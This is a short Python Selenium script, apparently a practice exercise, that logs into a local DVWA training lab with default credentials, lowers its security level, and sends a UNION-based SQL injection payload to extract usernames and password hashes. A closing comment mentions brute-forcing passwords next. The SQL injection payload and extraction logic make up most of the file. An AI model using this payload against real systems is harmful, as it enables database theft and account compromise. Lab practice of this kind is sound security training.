from selenium import webdriver
from selenium.webdriver.support.ui import Select
import time
import re


driver = webdriver.Chrome()
driver.get("http://localhost/DVWA")

username = 'admin'
password = 'password'

# Find the username and password input fields on the login page using various locators
username_field = driver.find_element('name', 'username')  
password_field = driver.find_element('name', 'password') 

# Enter the username and password into their respective fields
username_field.send_keys(username)
password_field.send_keys(password)

# Find and click the login button
login_button = driver.find_element('name', 'Login')  
login_button.click()

# After logging in, navigate to the desired page
driver.get("http://localhost/DVWA/security.php")

select_element = driver.find_element('name', 'security') 

# Use the Select class to interact with the <select> element
select = Select(select_element)

# Select the option with value "low"
select.select_by_value('low')

submit_button = driver.find_element('name', 'seclev_submit')
submit_button.click()



print("Injecting sql UNION command")
driver.get(f"http://localhost/DVWA/vulnerabilities/sqli/?id=%27+UNION+SELECT+user%2C+password+FROM+users%23&Submit=Submit#")
get_source = driver.page_source
target_text = 'First name'
print("Fetching Database data...")
time.sleep(2)
if target_text in get_source:
    print("Sql injection successful!")
    pattern = re.compile(r'<pre>(.*?)</pre>', re.DOTALL)  # DOTALL flag matches across newlines

    # Use regex to find all matches of the pattern in the raw HTML source
    matches = pattern.findall(get_source)

    # Iterate through the matches and extract the text content inside <pre> tags
    for match in matches:
        text_inside_pre = match.strip()  # Remove leading and trailing spaces/newlines
        print(text_inside_pre)  # P
    time.sleep(5)
else:
    print("Sql injection failed")
    

# now we start sending a bunch of GET requests to see which password is right 


print()